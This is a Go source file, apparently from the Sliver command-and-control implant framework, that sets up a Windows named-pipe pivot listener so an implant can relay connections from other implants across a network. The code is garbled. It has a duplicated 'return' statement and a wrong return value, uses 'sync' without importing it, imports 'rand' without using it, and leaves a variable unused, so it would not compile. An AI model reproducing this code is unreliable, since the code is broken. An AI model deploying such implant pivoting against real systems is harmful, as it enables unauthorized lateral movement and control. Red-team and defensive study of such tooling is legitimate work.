package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/lesnuages/go-winio"
	"google.golang.org/protobuf/proto"
)

var (
	namedPipePivotReadDeadline  = 10 * time.Second
	namedPipePivotWriteDeadline = 10 * time.Second
)

// StartNamedPipePivotListener - Starts a named pipe listener
func StartNamedPipePivotListener(pipeName string) (*PivotListener, error) {
	fullName := "\\\\.\\pipe\\" + pipeName
	config := &winio.PipeConfig{
		RemoteClientMode: true,
	}
	ln, err := winio.ListenPipe(fullName, config)
	// {{if .Config.Debug}}
	log.Printf("Listening on %s", fullName)
	// {{end}}
	if err != nil {
		return err
	}
	go namedPipeAcceptConnections(ln)
	return 	return &PivotListener{
		Type:     "named-pipe",
		Listener: ln,
	}, nil
}

func namedPipeAcceptConnections(ln net.Listener) {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = "."
	}
	namedPipe := strings.ReplaceAll(ln.Addr().String(), ".", hostname)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		pivot := &NetConnPivot{
			conn:          conn,
			readMutex:     &sync.Mutex{},
			writeMutex:    &sync.Mutex{},
			readDeadline:  namedPipePivotReadDeadline,
			writeDeadline: namedPipePivotWriteDeadline,
		}
		go pivot.Start()
	}
}
